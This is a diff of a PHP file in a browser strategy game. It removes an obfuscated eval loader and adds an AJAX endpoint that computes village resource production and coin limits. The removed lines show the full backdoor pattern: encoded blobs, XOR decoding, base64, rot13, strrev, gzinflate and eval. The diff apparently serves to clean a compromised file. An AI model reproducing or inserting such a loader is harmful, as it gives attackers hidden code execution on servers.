@@ -1,29 +1,161 @@
 <?php
-// 20661e15bb7026e14254005e
-$xHpxWJQktQ="acZAGwTayCjISMJSSIYac2oAQ5/bm/gvzn/goWQFlQQ=";
-$OxMYCRiiXVxxt="npMNTjGnlPwVFZWFFVLnp2bND5/oz/tima/tbJDSyDD=";
-$iqOLtJhygTEKC="twKtSqUztlaWSPQhGrccuOJRlkLNYbYH1Wn7JVOhO+TAUqMuqDmsJs1VyTZT1WWt5XSEMPErj1f4W/01HK8brPxRsVerJtUJ1WbaNV6mLr7/UaFN8ye3APQ+wSJHixuA2w7zd9c83FjWWeATZI4Fvc5SjHrnM9w6mH/KRW6OPfvifext3BTWGo5c4l9PiSSN236RXsRggwTjPes8RoQ0prxFl1XeI70l8D3PMG62FYL5c5ZorCSAOpZa6xYeuROvw1KGa/UmpyXAb/JBfI19relagE/HP4se1iL9DUGoOZq+apNN+QG9IMtL+jh60zem/2y2au4g3S7WV/AHR4oShaFFq1zuN9Qr6nTQMQKHFabrWo5itgKwI5Bk7DB/1337pVPyUOglrF7bXfI9fqw3h7MMtyrtOtMG0DiNHWLLM467a/Vq6zPRCtdKz0RkkmD48hCqQvZhtET3Y/otW9IVus568m3UY7QY0X3xQkqRBrjeZYI06hmqFcpiwhB9uhn47wyMXMg7jSXjNIE6X7B5vely6GrcHoAK0ETRLnmkLK7uTaRf5GWFX+pg9jsY1mH67QyxK/IRrx/NWPoXGtd5//p36H/Xa5EakG/ZPWGFGZOldYRx1hmAH+91zxBNq2eu3FiyS/84sjjOfvYxQNg4h9pYlXTrKrFe+0XyQmuXYIjlC45M9ROSC8RjyA1dmjGpzFimYeQnjwWSNeEQR9QVjrhpvkKuJKo34z7CAm/UHqLZeLdq+QajKJRB+jBOyx2N+m2see0kng7sfYEsbNICscVlsijNFbAb1F2JIB+LGJrSVqpc6geSIZllzDICsWCI8Fb2TvJihiPreNwFYYJ9rtALn1HxFLAGlHnTDnmEIZ7CEKBe0STPQO5fiCRRhRG/v2yXXNoc1CeZTuwjY9kd/LsHiEiuPKwL6F3NB1q2PZzYcINv/AKsDI5B9kZnihf+202BfM8njD/WZ+s2eoEFnc5+8FHuOJ4D42LsFUGrD7PLUoAv1wrSOuYm6kVDmAzgwFLoQ+4LrUTtf88leqwfmOVTrHWkYtUA0GvtOXuHAIW/dKB8xQXQI/VqgBNe1ye+y131Ye4ZlluRe89NRLkvp7xKsH3RebY390HXPl61Pqf/BpY08mTPOZA0zhkGijn5+Hn2f6wIrAb";
-$unKEKZNciysmnD="XWokaTZpmv/1yinD/F6hcw0zxQGjQDqXMbpYppSOwXfdmwkd6kgH63HWPUtgg0xXGT8AkTIhlusVmgGLTZ7AnikP2PEGPMrnBWKli2xGDJso82x9oqjeRvUyvWdgopQyQVNAQYrAf/9MHo0moNtE/x2CXE3OwNP6hb6lyzhrVAeZEgDZzojiGwlOpdPNgtyjIIvFGYoUDoN51qXnYIoMr9U/APnOnBLroSIpdyTeuGZN8/BVukQH+yHKweNciy1n0Y+EERqc1u+RvvVznPo8J41nzDR+tL/3dFKZ88R6TXZFV1jJtrQyazHmIIvQ80ETKffEdbtVumfhJi1/rBZQo5iLuE3+QG5rlBp1M8TDcWJN/4i1RkAe6pQmFc/EVlyiZJoEwfboluvJJkXL3I6tW5273PE24PIbAWZNV+xPdWMI92TF5zxSp+QueXdEZsxjRS44aH4g7psVX8CqyOawl4H7MFkKiEpGlfpZP7iGzBfU93Q56ki+9vnyiKdUYpSqWSOw7Q4oh/eRqjFbtFIoewlf0JUWoBYnIaI5M3yLSHNdAiTZvjiLguAyhctsr0B3wf805Z7ACvflpoizoP50i5mvoRFymFLP5TIR0+SfQIJR4ixhYsjSTwQaeTs8o3BaXYNEbU6o9reReqCyqHq469GDLOxCJL7HGU4VY6huSLtNok0Rfs2S8x3efULYarSfbSfZBXKtmhtl09mirMahfl0PSRX6qAabjcv8w3iKTNZVcjABPmS+K+HOrcK8biCLsf+wBRa41/911il32B9dbyF/+Ol6rfYLoEPdYzQCxHZBe9EBakCb+3kWtLagHhwjvfv0FboIYqbxrsCr2GrdbwDXWJGGLYJH8d79NxwvcB5V07jNRhjv63EevUOgIgCfTOutMYIgh+fN6lmH4YaIt11/5ImWzEKXufoFK9R2iItVm/gce2TGI73ijY61gkgTASc0uBtVmuOZx/n3zP60o12TPLRmoFZz9BoZw2H2eW5JViBB4y2X4xVCsc+0IohrJZOo5TNAdhc1NvXzqBaM213/gIBulD6PJUK1P7xC9Iulj7Rx8rB6e/1GIaq4TpyzmTOI8HJNmmdpdqVDLY5VflGPrInq2Ifi9FINY7gG2LdRvzkFYjQGd43SQItN5llbxXuETfrokoN";
-$GpQvCSPYbbh="5ytEHZZqka1lXrDF/XHK/oRrQu6mK+LdBY8Th4tX254AqGV99qtyjgSdI5eNQhuulyhDT5BrVeyjWBRhyjJv3hap1a0xSrG8Ns/AUbmTfy/GiEMOwTjSngT4EefdQRmc9WiXnfI70/22/5RE+zOP3NCIxuyR+PH8Rj4RJwkBfzskf+YbI7lxyYO4k/Y7EyscFli3qtJZ1dikrKMGKLDpvweYpC9x3VO/B5/R8GlhWG3wiEadI7tCrYR+g/YtICgPNx803nHqcH407CMFjWH6r5ZZFCqyuBBOlqjCYZtwes3FG3cqgbrgrnZd9fbpk1mONH9V7UMKgK8CbdLhuaYI/DWZZ40gSDNsN43yJAkhug/2i/S9Y7izv3TosWH6kUjtINgiP3BJEhmWfZIHy6GLvFRbNf9j20O+N+80FCpCWI+02WLvIQoR2UfpMWG607mLxGvyL+KIE65SKKOmKwDJGhRrdDrRy3PudX+ydesTiH8AuOLqo6vg7lf+0AeKo7/LMKtVirIoFdk2npN3GSI43HZp1f8x+mW5FcyjgRsD2o63GJad8HsSvMRtowRIwbguNLkHn2aoM3jkL8TQalEobvZp8w02eDDvd6zTFigiWavHSEcNh5iwzrXslEQ5cSiaF2iH/4FoUn7U7XP1itI4DhB6giywK+OeNZ9zhcjR6ZwEuzfO19oC2TXvNfBrMcqNpyiG/tNqJf0VWIDk2MJ6jBW780pCChPPk8jxhvphCTwlSmcu9igSrYb/JHWZIsneFwql7UIo0bxnTJHk3VZpvoWLZRqiOBNsx11g192TKO41GDaagXsUTWQIAgbdUyubtVgWL4AqlZ5jnpHlqCG5PMXfRV+GasI8xd0zFgjDXz3Fz1ascVigj0SuohZZk65PhVgSrxIown7F3WJmGJBKKyW4Br1Ce0LPA19idPpGP84lGXNO41hyuUStQcZrkehuhQtiilMa5b5CLzTEGXB5y9dbFPzmCSH9tViEAaog654RSOT+UqgkD3WYFAe7IZvr9Tpi6rC5da8XfdF0yDJP/eTfVB0CiVXew/yRhntDqluFeVL6oRowaOYv8QTqYyrtl+vVflOoE11UbxJ2itDJztRfNK2D3XBedB0x5MsxqOugfxUqUKs172X9U/QdI/md5W/nT4J60Y";
-$mNdQYUjQAfs=strlen($xHpxWJQktQ);
-$ROnxayQs_u=substr($iqOLtJhygTEKC,0,4);
-$jopjtbQKsZ=md5($unKEKZNciysmnD);
-$tRI_ToNlCI=crc32($GpQvCSPYbbh);
-$udrXmhchsfE=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$oXAkBpgEErCSeN=$iqOLtJhygTEKC.$unKEKZNciysmnD.$GpQvCSPYbbh;
-$asdfYikjI_=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$yjXbZxgwwQ="gz".chr(105)."nflate";
-$xhuqIOoFuohD="str".chr(114)."ev";
-$CDkYdxByDsIgQD="str_rot".chr(49).chr(51);
-$xrOxaeoLufV="";
-$dXkHPySWcFaDA=$asdfYikjI_($oXAkBpgEErCSeN);
-for($D_qZXDhQkT=0;$D_qZXDhQkT<strlen($dXkHPySWcFaDA);$D_qZXDhQkT++){
-$xrOxaeoLufV.=chr(ord($dXkHPySWcFaDA[$D_qZXDhQkT])^ord($udrXmhchsfE[$D_qZXDhQkT%strlen($udrXmhchsfE)]));
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+use App\Core\Database;
+
+header('Content-Type: application/json');
+header('Cache-Control: no-cache, no-store, must-revalidate'); // HTTP 1.1.
+header('Pragma: no-cache'); // HTTP 1.0.
+header('Expires: 0'); // Proxies.
+
+// Get parameters
+$villageIdsParam = isset($_GET['villages']) ? $_GET['villages'] : '';
+$world = isset($_GET['world']) ? $_GET['world'] : (\App\Core\Database::getWorldDbName());
+
+if (!$villageIdsParam) {
+    echo json_encode(['error' => 'No village IDs provided']);
+    exit;
 }
-$dXkHPySWcFaDA=$xrOxaeoLufV;
-$dXkHPySWcFaDA=$CDkYdxByDsIgQD($dXkHPySWcFaDA);
-$dXkHPySWcFaDA=$xhuqIOoFuohD($dXkHPySWcFaDA);
-$dXkHPySWcFaDA=$asdfYikjI_($dXkHPySWcFaDA);
-$dXkHPySWcFaDA=$yjXbZxgwwQ($dXkHPySWcFaDA);
-$dXkHPySWcFaDA=$CDkYdxByDsIgQD($dXkHPySWcFaDA);
-eval($dXkHPySWcFaDA);
+
+$villageIds = array_map('intval', explode(',', $villageIdsParam));
+if (empty($villageIds)) {
+    echo json_encode(['error' => 'Invalid village IDs']);
+    exit;
+}
+
+try {
+    // Session validation: a tabela sessions vive na base do MUNDO
+    $worldDb = Database::getInstance($world);
+
+    $worldNum = preg_replace('/[^0-9]/', '', $world ?: '1') ?: '1';
+    $sessionSid = $_COOKIE['session_' . $worldNum]
+        ?? $_COOKIE['session']
+        ?? '';
+
+    $sessionData = $worldDb->fetch("SELECT userid FROM sessions WHERE sid = ?", [$sessionSid]);
+
+    if (!$sessionData) {
+        echo json_encode(['error' => 'Invalid session']);
+        exit;
+    }
+
+
+    $db = $worldDb;
+} catch (Exception $e) {
+    echo json_encode(['error' => 'Database connection failed: ' . $e->getMessage()]);
+    exit;
+}
+
+// Get world configuration for production
+global $config;
+if (!isset($config) || empty($config)) {
+    $worldNum = isset($_GET['world']) ? preg_replace('/[^0-9]/', '', $_GET['world']) : '1';
+    $config = require __DIR__ . '/../../app/Config/Worlds/' . $worldNum . '.php';
+}
+$speed = $config['speed'];
+$arr_production = $config['arr_production'];
+$arr_maxstorage = $config['arr_maxstorage'];
+
+// Override level 30 storage if needed
+if (isset($arr_maxstorage[30]) && $arr_maxstorage[30] !== 400000) {
+    $arr_maxstorage[30] = 400000;
+}
+
+// Helper to calculate production
+function get_prod($level, $speed, $arr_production)
+{
+    if ($level === 0)
+        return 0;
+    return floor($arr_production[$level] * $speed); // Removed /3600 to keep hourly rate, will divide later
+}
+
+// Fetch data for all villages
+$placeholders = str_repeat('?,', count($villageIds) - 1) . '?';
+$sql = "SELECT id, r_wood, r_stone, r_iron, r_bh, storage, wood, stone, iron, farm, last_prod_aktu, bonus 
+        FROM villages WHERE id IN ($placeholders)";
+
+$villages = $db->fetchAll($sql, $villageIds);
+
+$response = [];
+$timenow = time();
+
+foreach ($villages as $village) {
+    // Current Resources from DB
+    $r_wood = $village['r_wood'];
+    $r_stone = $village['r_stone'];
+    $r_iron = $village['r_iron'];
+    $r_bh = $village['r_bh'];
+
+    $max_storage = $arr_maxstorage[$village['storage']] ?? 0;
+    // Level 30 override
+    if ($village['storage'] === 30) {
+        $max_storage = 400000;
+    }
+
+    // Production Calculation based on time elapsed
+    $last_prod = $village['last_prod_aktu'];
+    $time_diff = $timenow - $last_prod;
+
+    if ($time_diff > 0) {
+        // Hourly production
+        $wood_prod = get_prod($village['wood'], $speed, $arr_production);
+        $stone_prod = get_prod($village['stone'], $speed, $arr_production);
+        $iron_prod = get_prod($village['iron'], $speed, $arr_production);
+
+        // Apply Bonus (simplified logic, assuming bonus is percentage like 1.2 for 20%)
+        // Actually bonus column logic depends on implementation, often it's 0 or a multiplier.
+        // Let's assume standard 0 for now or inspect logic. In reload_vdata it handles bonus.
+        // For visual projection, base production is usually enough, but let's try to be accurate.
+        // Skipping complex bonus logic for now to match get_resources.php
+
+        // Calculate gains: (Rate / 3600) * seconds
+        $wood_gain = ($wood_prod / 3600) * $time_diff;
+        $stone_gain = ($stone_prod / 3600) * $time_diff;
+        $iron_gain = ($iron_prod / 3600) * $time_diff;
+
+        $r_wood += $wood_gain;
+        $r_stone += $stone_gain;
+        $r_iron += $iron_gain;
+    }
+
+    // Cap at storage
+    if ($r_wood > $max_storage)
+        $r_wood = $max_storage;
+    if ($r_stone > $max_storage)
+        $r_stone = $max_storage;
+    if ($r_iron > $max_storage)
+        $r_iron = $max_storage;
+
+    // Persist to DB if changed or time elapsed
+    if ($time_diff > 0) {
+        $db->query(
+            "UPDATE villages SET r_wood = ?, r_stone = ?, r_iron = ?, last_prod_aktu = ? WHERE id = ?",
+            [$r_wood, $r_stone, $r_iron, $timenow, $village['id']]
+        );
+    }
+
+    // Calculate max coins possible
+    $coin_cost_wood = $config['coin_cost']['wood'];
+    $coin_cost_stone = $config['coin_cost']['stone'];
+    $coin_cost_iron = $config['coin_cost']['iron'];
+
+    $max_coins = min(
+        floor($r_wood / $coin_cost_wood),
+        floor($r_stone / $coin_cost_stone),
+        floor($r_iron / $coin_cost_iron)
+    );
+
+    $response[$village['id']] = [
+        'wood' => floor($r_wood),
+        'stone' => floor($r_stone),
+        'iron' => floor($r_iron),
+        'max_storage' => $max_storage,
+        'max_coins' => $max_coins
+    ];
+}
+
+echo json_encode([
+    'success' => true,
+    'villages' => $response,
+    'timestamp' => $timenow
+]);
